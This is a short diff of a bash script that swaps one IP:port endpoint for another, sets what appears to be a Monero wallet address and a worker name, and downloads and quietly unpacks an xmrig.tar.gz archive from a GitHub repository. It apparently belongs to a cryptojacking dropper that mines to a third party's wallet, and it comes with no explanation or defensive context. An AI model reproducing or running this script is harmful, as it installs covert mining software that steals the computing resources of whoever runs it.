@@ -1,5 +1,5 @@
 #!/bin/bash
-A=188.166.251.178:443
+A=167.71.200.23:443
 B=SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC
 C=CAPLOK
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
